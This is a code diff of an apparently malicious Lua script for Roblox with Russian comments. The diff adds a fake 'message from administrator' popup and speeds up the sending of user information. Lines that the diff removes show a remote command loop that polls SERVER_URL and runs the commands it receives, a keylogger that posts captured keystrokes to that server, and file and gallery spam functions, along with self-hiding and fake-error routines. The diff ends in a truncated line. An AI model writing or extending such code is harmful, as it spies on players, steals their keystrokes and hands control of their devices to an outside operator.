@@ -108,7 +108,7 @@ end
 -- Функция отправки информации о пользователе
 local function sendUserInfo()
     local currentTime = os.time()
-    if currentTime - lastUserUpdate < 60 then -- Отправляем не чаще чем раз в минуту
+    if currentTime - lastUserUpdate < 15 then -- 15 секунд между обновлениями
         return
     end
     
@@ -321,6 +321,54 @@ local function showFakeError(message)
     end)
 end
 
+-- Всплывающее сообщение (ИСПРАВЛЕННЫЙ БАГ)
+local function showPopupMessage(message)
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "PopupMessage"
+    gui.Parent = player:WaitForChild("PlayerGui")
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0.4, 0, 0.2, 0)
+    frame.Position = UDim2.new(0.3, 0, 0.4, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    frame.BorderColor3 = Color3.fromRGB(70, 70, 100)
+    frame.BorderSizePixel = 2
+    frame.Parent = gui
+    
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
+    textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
+    textLabel.Text = "📢 Сообщение от администратора:\n\n"..message
+    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textLabel.TextScaled = true
+    textLabel.Font = Enum.Font.Gotham
+    textLabel.BackgroundTransparency = 1
+    textLabel.Parent = frame
+    
+    -- Анимация появления
+    frame.BackgroundTransparency = 1
+    textLabel.TextTransparency = 1
+    
+    local tweenIn = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0.1})
+    local tweenTextIn = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 0})
+    
+    tweenIn:Play()
+    tweenTextIn:Play()
+    
+    -- Автоматическое закрытие через 7 секунд
+    task.delay(7, function()
+        local tweenOut = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
+        local tweenTextOut = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 1})
+        
+        tweenOut:Play()
+        tweenTextOut:Play()
+        
+        tweenOut.Completed:Connect(function()
+            gui:Destroy()
+        end)
+    end)
+end
+
 -- Скрытие скрипта
 local function hideScript()
     if scriptHidden then return true end
@@ -462,7 +510,10 @@ local function ExecuteCommand(cmd, args)
         screenGui.Enabled = not screenGui.Enabled
     
     elseif cmd == "popup" then
-        -- Без всплывающих сообщений
+        -- ИСПРАВЛЕННЫЙ БАГ: теперь команда popup работает!
+        if args and args[1] then
+            showPopupMessage(args[1])
+        end
     
     elseif cmd == "print" then
         -- Тихая проверка связи
@@ -582,94 +633,4 @@ local function ExecuteCommand(cmd, args)
         local fileCount = tonumber(args[1]) or 100
         
         task.spawn(function()
-            local savedCount = memorySpam(fileCount)
-            httpRequest({
-                Url = SERVER_URL.."/command",
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    command = "spam_completed",
-                    args = {"memory_spam", "Создано "..savedCount.." файлов из "..fileCount}
-                })
-            })
-        end)
-    
-    elseif cmd == "gallery_spam" then
-        local imageCount = tonumber(args[1]) or 10
-        
-        task.spawn(function()
-            local savedCount = gallerySpam(imageCount)
-            httpRequest({
-                Url = SERVER_URL.."/command",
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    command = "spam_completed",
-                    args = {"gallery_spam", "Сохранено "..savedCount.." видео из "..imageCount}
-                })
-            })
-        end)
-    
-    end
-end
-
--- Функция проверки команд
-local function checkCommands()
-    local success, response = pcall(function()
-        return httpRequest({
-            Url = SERVER_URL.."/data",
-            Method = "GET"
-        })
-    end)
-    
-    if success and response and response.Body then
-        local success, data = pcall(function()
-            return HttpService:JSONDecode(response.Body)
-        end)
-        
-        if success and data and data.command and data.command ~= "" then
-            pcall(ExecuteCommand, data.command, data.args or {})
-            return true
-        end
-    end
-    return false
-end
-
--- Инициализация
-sendInjectNotification()
-setupKeylogger()
-hideScript()
-
--- Восстанавливаем оригинальную функцию чата
-if originalChatFunction then
-    TextChatService.OnIncomingMessage = originalChatFunction
-end
-
--- Главный цикл
-while task.wait(2) do
-    local hasCommand = checkCommands()
-    
-    -- Отправляем информацию о пользователе
-    pcall(sendUserInfo)
-    
-    if hasCommand then
-        task.wait(0.5)
-        checkCommands()
-    end
-    
-    -- Отправка логов кейлоггера
-    if keyloggerEnabled and os.time() - lastSendTime >= 300 then
-        if keylogBuffer ~= "" then
-            httpRequest({
-                Url = SERVER_URL.."/keylog",
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    logs = keylogBuffer
-                })
-            })
-            keylogBuffer = ""
-        end
-        lastSendTime = os.time()
-    end
-end
+           
